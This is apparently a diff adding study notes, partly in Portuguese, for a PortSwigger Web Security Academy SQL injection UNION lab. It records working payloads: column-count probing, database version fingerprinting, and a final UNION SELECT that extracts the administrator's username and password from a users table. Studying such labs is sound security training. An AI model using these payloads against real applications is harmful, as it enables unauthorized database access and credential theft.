@@ -1,0 +1,49 @@
+\\Lab: SQL injection UNION attack, retrieving multiple values in a single column//
+---------------------------------------------------------------------------------
+________________________________DICA__________________________________
+|                                                                     |
+|DICA: https://portswigger.net/web-security/sql-injection/cheat-sheet |
+|_____________________________________________________________________|
+
+
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+
+ac391f4c1f48295bc07d7dbb007c008f.web-security-academy.net/filter?category=
+
+'ORDER BY 2--
+
+'UNION SELECT NULL, 'a'--
+
+
+VAMOS TER QUE FAZER UMA CONCATENAÇÃO PARA TRAZER OS RESULTADOS
+|------------------------------------------------------------------|
+|Oracle  	'foo'||'bar'                                           |
+|Microsoft	'foo'+'bar'                                            |
+|PostgreSQL	'foo'||'bar'                                           |
+|MySQL	    'foo' 'bar' [Note the space between the two strings]   |
+|            CONCAT('foo','bar')                                   |
+|------------------------------------------------------------------|
+
+Database version
+
+Oracle:     SELECT banner FROM v$version OU SELECT version FROM v$instance
+Microsoft:  SELECT @@version
+PostgreSQL: SELECT version()
+MySQL:      @@version
+
+MORE: Database https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+----------------------------------------------------------------------
+Descobrindo qual banco de dados a aplicação utiliza.
+'UNION SELECT NULL, version() OU
+'UNION SELECT NULL, @@version OU
+'UNION SELECT NULL, vesrion
+
+'UNION SELECT NULL, version()--
+
+Descobrimos que o banco de dados é:
+PostgreSQL 12.10 (Ubuntu 12.10-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+Inserindo a função com concatenação
+PostgreSQL: 'foo'||'bar' 
+'UNION SELECT NULL,username || '==' || password FROM users WHERE username='administrator'--
